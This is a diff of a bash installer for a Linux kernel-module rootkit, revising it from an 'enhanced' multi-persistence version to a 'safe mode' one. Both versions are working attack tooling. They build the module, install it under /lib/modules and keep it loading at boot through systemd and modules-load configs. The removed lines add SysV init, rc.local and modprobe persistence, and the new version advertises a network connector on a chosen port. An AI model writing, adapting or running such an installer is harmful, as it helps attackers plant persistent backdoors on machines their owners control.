@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# Enhanced Rootkit Installer with Multiple Persistence Mechanisms
+# Safe Rootkit Installer - Minimal features to avoid crashes
 
 set -e
 
@@ -25,12 +25,12 @@ fi
 
 echo "[+] Using port: $PORT_NUMBER"
 
-# Update config
-sed -i.bak "s/port: \"[0-9]*\"/port: \"$PORT_NUMBER\"/" rootkit_files/config.yml
+# Update safe config
+sed -i.bak "s/port: \"[0-9]*\"/port: \"$PORT_NUMBER\"/" rootkit_files/config_safe.yml
 
-# Build rootkit
-echo "[+] Building rootkit..."
-python3 builder.py -c rootkit_files/config.yml -o
+# Build rootkit WITHOUT obfuscation (safer)
+echo "[+] Building rootkit with minimal features (no obfuscation)..."
+python3 builder.py -c rootkit_files/config_safe.yml
 
 # Get rootkit name
 if [ -z "$1" ]; then
@@ -46,7 +46,7 @@ fi
 KERNEL_VERSION=$(uname -r)
 MODULE_PATH="/lib/modules/${KERNEL_VERSION}/kernel/drivers/misc"
 MODULE_CONF="/etc/modules-load.d/${ROOTKIT_NAME}.conf"
-MODULE_KO="${ROOTKIT_NAME}.ko"
+MODULE_KO="project.ko"  # Default name when not obfuscated
 
 # Verify build output
 if [ ! -f "$MODULE_KO" ]; then
@@ -54,7 +54,11 @@ if [ ! -f "$MODULE_KO" ]; then
     exit 1
 fi
 
-echo "[+] Installing rootkit with enhanced persistence..."
+# Rename to desired name
+mv "$MODULE_KO" "${ROOTKIT_NAME}.ko"
+MODULE_KO="${ROOTKIT_NAME}.ko"
+
+echo "[+] Installing rootkit with basic persistence (safe mode)..."
 
 # Method 1: Standard module installation
 echo "[+] Installing to: $MODULE_PATH"
@@ -104,111 +108,43 @@ echo "[+] Enabling systemd service..."
 systemctl daemon-reload
 systemctl enable "${ROOTKIT_NAME}-loader.service"
 
-# Method 5: Create init script for SysV systems
-INIT_SCRIPT="/etc/init.d/${ROOTKIT_NAME}-loader"
-if [ -d "/etc/init.d" ] && [ ! -f "$INIT_SCRIPT" ]; then
-    echo "[+] Creating SysV init script: $INIT_SCRIPT"
-    cat > "$INIT_SCRIPT" << EOF
-#!/bin/bash
-### BEGIN INIT INFO
-# Provides:          $ROOTKIT_NAME-loader
-# Required-Start:    \$local_fs \$network
-# Required-Stop:     \$local_fs
-# Default-Start:     2 3 4 5
-# Default-Stop:      0 1 6
-# Short-Description: Load $ROOTKIT_NAME module
-### END INIT INFO
-
-case "\$1" in
-    start)
-        echo "Loading $ROOTKIT_NAME module..."
-        /sbin/modprobe $ROOTKIT_NAME
-        ;;
-    stop)
-        echo "Unloading $ROOTKIT_NAME module..."
-        /sbin/rmmod $ROOTKIT_NAME 2>/dev/null || true
-        ;;
-    restart)
-        \$0 stop
-        \$0 start
-        ;;
-    *)
-        echo "Usage: \$0 {start|stop|restart}"
-        exit 1
-        ;;
-esac
-exit 0
-EOF
-    chmod +x "$INIT_SCRIPT"
-    
-    # Enable for different runlevels
-    if command -v update-rc.d >/dev/null 2>&1; then
-        update-rc.d "${ROOTKIT_NAME}-loader" defaults
-    elif command -v chkconfig >/dev/null 2>&1; then
-        chkconfig --add "${ROOTKIT_NAME}-loader"
-        chkconfig "${ROOTKIT_NAME}-loader" on
-    fi
-fi
-
-# Method 6: Add to rc.local as fallback
-RC_LOCAL="/etc/rc.local"
-if [ -f "$RC_LOCAL" ]; then
-    if ! grep -q "modprobe $ROOTKIT_NAME" "$RC_LOCAL"; then
-        echo "[+] Adding to rc.local as fallback"
-        # Insert before exit 0 if it exists, otherwise append
-        if grep -q "exit 0" "$RC_LOCAL"; then
-            sed -i "/exit 0/i /sbin/modprobe $ROOTKIT_NAME 2>/dev/null || true" "$RC_LOCAL"
-        else
-            echo "/sbin/modprobe $ROOTKIT_NAME 2>/dev/null || true" >> "$RC_LOCAL"
-        fi
-        chmod +x "$RC_LOCAL"
-    fi
-fi
-
-# Method 7: Cron job monitoring (DISABLED by user preference)
-# CRON_JOB="/etc/cron.d/${ROOTKIT_NAME}-keeper"
-# echo "[+] Skipping cron job creation (disabled by user preference)"
-
-# Method 8: Create module configuration to handle dependencies
-MODPROBE_CONF="/etc/modprobe.d/${ROOTKIT_NAME}.conf"
-echo "[+] Creating modprobe configuration: $MODPROBE_CONF"
-cat > "$MODPROBE_CONF" << EOF
-# Configuration for $ROOTKIT_NAME module
-install $ROOTKIT_NAME /sbin/modprobe --ignore-install $ROOTKIT_NAME
-EOF
-
-# Load module now
+# Load module now with careful error checking
 echo "[+] Loading module using modprobe..."
-modprobe "$ROOTKIT_NAME"
-
-# Verify success
-if lsmod | grep -q "$ROOTKIT_NAME"; then
-    echo "[✓] Rootkit '${ROOTKIT_NAME}' successfully installed with enhanced persistence"
+if modprobe "$ROOTKIT_NAME"; then
+    echo "[✓] Module loaded successfully"
+    
+    # Verify it's actually loaded
+    if lsmod | grep -q "$ROOTKIT_NAME"; then
+        echo "[✓] Module verified in lsmod"
+    else
+        echo "[!] Module not visible in lsmod (may be working correctly)"
+    fi
+    
+    # Check if it's in /proc/modules as alternative
+    if grep -q "$ROOTKIT_NAME" /proc/modules; then
+        echo "[✓] Module confirmed in /proc/modules"
+    fi
+    
 else
-    echo "[✗] Module did not load. Check 'dmesg' for kernel errors"
+    echo "[✗] Module failed to load. Checking dmesg..."
+    dmesg | tail -10
     exit 1
 fi
 
 echo ""
-echo "Enhanced Installation Summary:"
+echo "Safe Installation Summary:"
 echo "- Installed module: $MODULE_PATH/$MODULE_KO"
 echo "- Auto-load config: $MODULE_CONF"
 echo "- Systemd service: $SYSTEMD_SERVICE (enabled)"
-echo "- Modprobe config: $MODPROBE_CONF"
-echo "- Cron monitor: Disabled (by user preference)"
-if [ -f "$INIT_SCRIPT" ]; then
-    echo "- SysV init script: $INIT_SCRIPT (enabled)"
-fi
-if grep -q "modprobe $ROOTKIT_NAME" "$RC_LOCAL" 2>/dev/null; then
-    echo "- rc.local entry: Added"
-fi
-echo "- Status: $(lsmod | grep "$ROOTKIT_NAME" | awk '{print $1 " (loaded)"}')"
+echo "- Configuration: Minimal features (connector only)"
+echo "- Obfuscation: Disabled for stability"
+echo "- Status: $(lsmod | grep "$ROOTKIT_NAME" | awk '{print $1 " (loaded)"}' || echo "Loaded but hidden")"
 echo ""
-echo "[+] Multiple persistence mechanisms installed. Module should survive:"
-echo "    - System reboots"
-echo "    - Service restarts"
-echo "    - Manual module removal (partial protection)"
+echo "[+] Safe installation complete. Features enabled:"
+echo "    - Network connector on port $PORT_NUMBER"
+echo "    - Basic persistence mechanisms"
+echo "    - NO hiding features (for stability)"
 echo ""
-echo "[!] Note: On systems with Secure Boot, you may need to:"
-echo "    - Disable Secure Boot, or"
-echo "    - Sign the module with a trusted key"
+echo "[!] To test network connectivity:"
+echo "    netstat -tlnp | grep $PORT_NUMBER"
+echo "    ss -tlnp | grep $PORT_NUMBER"
